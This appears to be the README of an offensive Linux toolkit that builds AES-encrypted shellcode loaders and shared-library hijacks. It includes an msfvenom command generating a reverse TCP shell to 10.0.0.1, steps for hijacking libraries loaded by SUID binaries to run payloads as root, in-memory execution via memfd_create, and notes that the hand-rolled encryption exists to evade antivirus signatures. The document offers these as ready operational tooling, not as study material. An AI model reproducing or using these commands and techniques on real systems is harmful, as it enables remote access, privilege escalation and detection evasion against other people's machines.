# unix-injector

Linux payload execution and shared library hijacking toolkit. All payloads are AES-128-ECB encrypted at build time with a random key — no plaintext strings in any artifact. Accepts both raw shellcode (`msfvenom -f raw`) and ELF binaries (Paradigm, custom compiled, etc.).

## Quick start

```bash
# Raw shellcode
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=443 -f raw -o shellcode.bin

# Or drop any ELF binary as shellcode.bin — it just works

# Build everything
make all

# Or just the loader (default target)
make
```

Drop `shellcode.bin`, run `make`, get artifacts in `dist/`.

## Artifacts

| Target | Artifact | Use case |
|--------|----------|----------|
| `make` | `dist/shellcode-runner` | Static ELF — drop on target, run it |
| `make hijack-lib` | `dist/hijack-lib.so` | Generic LD_PRELOAD hijack |
| `make hijack TARGET=<lib>` | `dist/<lib filename>` | Targeted library hijack with auto-generated symbol stubs |

## Payload format

The toolkit auto-detects the payload type at runtime:

- **Raw shellcode** — `mmap` RWX + jump
- **ELF binary** (detected by `\x7fELF` magic) — `memfd_create` + `execve` from memory (nothing touches disk)

No flags needed. Same `shellcode.bin`, same `make`.

## Usage

### Shellcode runner

```bash
./shellcode-runner
```

Static binary, no dependencies. AES-decrypts the embedded payload at runtime and executes it.

### LD_PRELOAD hijack

```bash
LD_PRELOAD=./hijack-lib.so /path/to/target_binary
```

Constructor fires before `main()`, forks a child that runs the payload. Host process continues normally.

### Targeted library hijack

```bash
# On your box: find what the SUID binary loads
ldd /usr/bin/some_suid_binary

# Generate a hijack .so for that specific library
make hijack TARGET=/usr/lib/x86_64-linux-gnu/libwhatever.so.2

# On target: place in writable library search path
cp libwhatever.so.2 /writable/rpath/dir/
/usr/bin/some_suid_binary   # triggers the hijack
```

Reads exported symbols from the real `.so` via `readelf` and generates no-op function stubs (`return 0`) so the dynamic linker and other libraries' constructors don't crash. The constructor forks and runs the payload with `setuid(0)/setgid(0)` for SUID scenarios.

## Build options

```bash
make SHELLCODE=payload.bin   # Use a different payload file (default: shellcode.bin)
make clean                   # Remove dist/
```

Each `make clean && make` generates a fresh random AES key.

## Project layout

```
├── Makefile
├── src/
│   ├── shellcode-runner.c      # Loader: AES decrypt → detect format ��� execute
│   ├── aes.h                   # Hand-rolled AES-128-ECB decrypt (header-only, no crypto libs)
│   ├── aes-encoder.py          # Build-time AES encrypt with round-trip verification
│   ├── hijack-lib.c            # Generic LD_PRELOAD .so with AES payload constructor
│   └── gen-hijack-lib.py       # Generates targeted hijack .so from any shared library
└── dist/                       # Build artifacts (gitignored)
```

## Dependencies

Build host (Kali): `gcc`, `python3`, `readelf` (binutils) — all preinstalled.

Target: nothing. Shellcode runner is static. Hijack `.so` files link only against libc.

## Notes

- The AES implementation is hand-rolled (ported from [sharp-injector](../sharp-injector)'s `Encryptor.cs`) — no `libcrypto`/`libssl` imports for AV to flag
- ELF payloads execute via `memfd_create` — fully in-memory, no file dropped on disk
- Hijack libs clear `LD_PRELOAD` before `execve` to prevent recursive constructor triggering with ELF payloads
- Function stubs return 0/NULL — host process may behave oddly if it uses return values, but the payload has already forked by then
- ECB mode (no IV) — sufficient for signature evasion; the key is co-located in the binary anyway
